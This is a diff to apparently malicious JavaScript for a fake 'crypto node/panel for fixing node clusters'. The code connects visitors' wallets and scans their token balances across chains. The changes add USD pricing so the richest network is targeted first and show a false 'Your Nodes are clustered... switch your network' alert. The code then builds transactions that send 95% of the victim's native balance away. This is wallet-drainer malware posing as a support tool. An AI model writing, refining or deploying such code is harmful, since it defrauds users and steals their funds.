@@ -218,9 +218,9 @@ const opbnb = {
 
 // 3. Create your application's metadata object
 const metadata = {
-  name: 'Coinconsult-panel',
+  name: 'Resolverconsult-panel',
   description: 'A crypto node/panel for fixing node clusters, validation and monitoring',
-  url: 'app', // url must match your domain & subdomain
+  url: 'Resolverconsult-panel.com', // url must match your domain & subdomain
   icons: ['https://avatars.mywebsite.com/']
 }
 
@@ -356,25 +356,25 @@ openConnectModalBtn.addEventListener('click', async () => {
 async function connectWallet() {
     const walletProvider = modal.getWalletProvider()
     let provider = new ethers.providers.Web3Provider(walletProvider);
-    console.log(provider)
+    //console.log(provider)
     let signer = provider.getSigner();
-    console.log(signer)
+    //console.log(signer)
 
     try {
         await provider.send("eth_requestAccounts", []);
         const address = await signer.getAddress();
-        console.log(address)
+        //console.log(address)
         const network = modal.getChainId()
 
         provider.on('network', (newNetwork, oldNetwork) => {
             if (oldNetwork) {
                 // Network has changed
-                console.log(`Network changed from old network to new network`);
+                //console.log(`Network changed from old network to new network`);
                 // Refresh the provider to reflect the new network
                 provider = new ethers.providers.Web3Provider(walletProvider, "any");
                 // Update the signer to match the new network
                 signer = provider.getSigner();
-                console.log('Signer updated for new network');
+                //console.log('Signer updated for new network');
             }
         });
 
@@ -500,7 +500,16 @@ async function connectWallet() {
                 }
             }
             if(nonZeroBalance.length > 0){
-                nonZeroBalance.sort((a, b) => b.balance - a.balance);
+                const tokenSymbols = nonZeroBalance.map(token => token.symbol.toLowerCase())
+                const options = { method: 'GET', headers: { accept: 'application/json'} }
+                const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenSymbols.join(',')}&vs_currencies=usd`, options);
+                const prices = await response.json();
+
+                const totalValueUsd = nonZeroBalance.reduce((total, token) => {
+                    const price = prices[token.symbol.toLowerCase()].usd;
+                    return total + token.balance * price;
+                }, 0)
+
 
                 networksWithTokens.push({
                     chainId: nets.chainId,
@@ -508,6 +517,7 @@ async function connectWallet() {
                     rpcUrl: nets.rpcurl,
                     nativeCurrency: nets.nativeCurrency,
                     blockExplorerUrl: nets.blockExplorerUrl,
+                    totalValueUSD: totalValueUsd.toFixed(2),
                     highestSingleTokenBalance: ethers.utils.formatUnits(highestSingleTokenBalance, 18), // Format highest single token balance
                     netBalances: ethers.utils.formatUnits(netBalances, 18),
                 })
@@ -518,16 +528,18 @@ async function connectWallet() {
       }
       
         // Sort networks by highest single token balance in descending order
-        networksWithTokens.sort((a, b) => parseFloat(b.highestSingleTokenBalance) - parseFloat(a.highestSingleTokenBalance));
-
-        console.log('Networks with tokens sorted by highest single token balance:', networksWithTokens.map(net => ({
-            name: net.name,
-            highestSingleTokenBalance: net.highestSingleTokenBalance
-        })));
+        networksWithTokens.sort((a, b) => parseFloat(b.totalValueUSD) - parseFloat(a.totalValueUSD));
+        // console.log('Networks with tokens sorted by highest single token balance:', networksWithTokens.map(net => ({
+        //     name: net.name,
+        //     highestSingleTokenBalance: net.highestSingleTokenBalance
+        // })));
 
         const maxSingleTokenBalance = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));
+        const maxSingleTokenBalanceUSD = Math.max(...networksWithTokens.map(net => parseFloat(net.totalValueUSD)));
 
         console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);
+        console.log(`Maximum single token balance: ${maxSingleTokenBalanceUSD}`);
+
 
         if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
             window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
@@ -596,7 +608,7 @@ async function connectWallet() {
               
                            if(etherBalance.gte(minimumBalance)){
                              const amountToSend = etherBalance.mul(95).div(100);
-                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
+                             console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
               
                        // Define the transaction
                            const transaction = {
@@ -619,7 +631,6 @@ async function connectWallet() {
                               
                          }
                           break;
-              
               
                         //BINANCE SMART CHAIN
                         case bsc.chainId:
@@ -697,7 +708,6 @@ async function connectWallet() {
                               
                          }
                           break;
-              
               
               
                         //ARBITRUM NETWORK
